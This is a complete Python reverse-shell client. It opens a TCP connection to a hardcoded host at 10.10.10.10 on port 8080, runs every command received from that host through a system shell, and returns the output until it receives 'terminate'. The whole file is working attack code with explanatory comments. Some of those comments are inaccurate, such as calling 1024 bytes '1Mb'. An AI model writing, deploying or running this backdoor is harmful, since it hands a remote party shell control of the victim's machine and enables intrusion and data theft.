#Client

import socket       #For building TCP Connection
import subprocess   #To start he shell in the system

def connect():

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.10.10",8080))   #Specify the IP address and Port number

    while True:
        command=s.recv(1024)      #Receiving 1Mb of data

        if 'terminate' in command:
            s.close() #Close the socket
            break

        else:
            CMD=subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)  #Starting the shell
            s.send(CMD.stdout.read())  #Send the result
            s.send(CMD.stderr.read())  #Exception Handling

def main():
    connect()
main()
